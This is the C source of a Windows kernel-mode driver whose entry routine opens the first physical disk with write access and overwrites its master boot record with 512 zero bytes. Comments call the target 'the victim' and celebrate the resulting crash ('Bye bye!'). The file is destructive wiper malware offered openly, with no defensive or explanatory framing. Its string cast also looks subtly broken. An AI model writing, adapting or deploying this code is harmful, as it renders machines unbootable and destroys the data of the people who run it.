#include <ntifs.h>
#include <windef.h>

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
	//not needed
	UNREFERENCED_PARAMETER(DriverObject);
	UNREFERENCED_PARAMETER(RegistryPath);
	
	//definitions
	UNICODE_STRING deviceName;
	OBJECT_ATTRIBUTES objectAttributes;
	HANDLE handle;
	IO_STATUS_BLOCK ioStatusBlock;
	NTSTATUS status;


	//Data that will be written onto the mbr
	UCHAR data[512] = { 0x0 };

	RtlInitUnicodeString(&deviceName, (LPCWSTR)((DWORD)"\\Device\\Harddisk0\\Partition0"));
	InitializeObjectAttributes(&objectAttributes, &deviceName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
	//Open handle to disk!
	status = ZwCreateFile(&handle, GENERIC_WRITE, &objectAttributes, &ioStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	if (NT_SUCCESS(status)) {

		//Overwrite MBR(first 512 bytes) using the handle we opened to disk earlier!
		status = ZwWriteFile(handle, NULL, NULL, NULL, &ioStatusBlock, data, 512, NULL, NULL);
		
		//Close handle to keep it clean!
		ZwClose(handle);

		if (NT_SUCCESS(status)) {
			//Will BSOD instantly once overwritten therefore you give the victim a good bye!
			KdPrint(("Bye bye!"));
		}
	}
	return STATUS_SUCCESS;
}
